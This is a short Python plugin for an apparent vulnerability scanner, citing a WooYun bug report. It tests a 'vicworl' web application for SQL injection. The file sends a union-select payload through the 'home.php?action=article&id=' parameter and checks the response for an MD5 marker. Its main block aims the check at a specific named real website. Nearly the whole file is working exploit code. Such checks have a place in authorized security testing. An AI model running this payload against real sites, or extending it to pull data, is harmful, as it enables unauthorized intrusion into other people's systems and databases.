#!/usr/bin/python
#-*- encoding:utf-8 -*-
#__author__ = '1c3z'
#http://www.wooyun.org/bugs/wooyun-2010-0105387

def assign(service, arg):
    if service == "vicworl":
        return True, arg


def audit(arg):
    import urllib2
    payloads = ['home.php?action=article&id=-1%20union%20all%20select%201%2C2%2C3%2C4%2Cmd5%280x22%29--']
    for payload in payloads:
        url = arg + payload
        code, head,res, errcode, _ = curl.curl2(url)
        if 'b15835f133ff2e27c7cb28117bfae8f4' in res:
            security_hole(url)
                        
if __name__ == '__main__':
    from dummy import *
    audit(assign('vicworl', 'http://show.qzgb.com/')[1])